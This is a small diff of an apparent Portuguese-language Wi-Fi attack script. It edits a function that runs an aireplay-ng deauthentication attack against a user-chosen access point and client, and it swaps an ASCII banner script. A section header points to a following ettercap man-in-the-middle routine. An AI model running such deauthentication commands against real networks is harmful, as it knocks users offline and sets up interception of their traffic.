@@ -67,8 +67,9 @@ deauth() {
     read client
     echo -n "Quantos pacotes de desautenticação? (0 = infinito): "
     read num
-    python3 ascii.py
     sudo aireplay-ng --deauth "$num" -a "$bssid" -c "$client" "$MON_IFACE"
+    python3 deauth_ascii.py "Deauthing "$bssid" client:"$client" iface:"$MON_IFACE""
+    
 }
 
 # MITM usando ettercap
